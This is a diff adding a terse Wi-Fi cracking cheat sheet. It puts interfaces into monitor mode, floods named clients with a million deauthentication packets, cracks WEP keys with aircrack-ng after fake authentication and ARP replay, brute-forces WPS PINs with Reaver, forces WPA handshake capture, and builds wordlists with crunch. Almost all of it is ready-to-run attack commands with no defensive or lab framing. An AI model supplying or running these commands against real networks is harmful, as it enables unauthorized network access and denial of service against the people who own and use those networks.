@@ -1,0 +1,118 @@
+=============================================
+
+iwconfig
+
+ifconfig wlan0 down
+
+airmon-ng check kill
+
+iwconfig wlan0 mode monitor
+
+ifconfig wlan0 up
+
+=============================================
+
+airodump-ng wlan0
+
+=============================================
+
+airodump-ng --band a wlan0
+
+airodump-ng --band abg wlan0
+
+=====================================================================
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write test wlan0
+
+=====================================================================
+
+aireplay-ng --deauth 1000000 -a 34:E9:11:03:A6:17 -c 90:78:41:4D:97:AC wlan0
+
+===========================================================================================
+
+[+] WEP ENCRYPT
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write test wlan0
+
+aircrack-ng nameOfFile.cap
+
+
+
+
+
+
+	You will get KEY FOUND! [41:73:32:33:70]
+	use 4173323370 as a password
+	if #data is slow, we need to associate with AP before launching the attack. You have do this step:
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write test wlan0
+
+aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h 16:0C:C4:77:3C:96 wlan0
+
+aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h 16:0C:C4:77:3C:96 wlan0
+
+===========================================================================================
+
+[+] WPA & WPA2 ENCRYPT
+
+wash --interface wlan0
+
+aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h 16:0C:C4:77:3C:96 wlan0
+
+(another terminal) ./reaver --bssid D2:C0:BF:91:FA:EF --channel 6 --interface wlan0 -vvv --no-associate
+
+===========================================================================================
+
+[+] WPA & WPA2 ENCRYPT
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write hand_shake wlan0
+
+	Wait until there's a handshake, you can use 
+
+	aireplay-ng --deauth 4 -a 00:11:22:33:44:55 -c 00:99:88:77:66:55 wlan0
+
+===========================================================================================
+
+creating wordlist 
+
+crunch 6 8 abc12 -o test.txt
+	
+	or
+
+crunch 6 6 abc12 -o test.txt -t a@@@@b
+
+	to open the file you can type: cat test.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
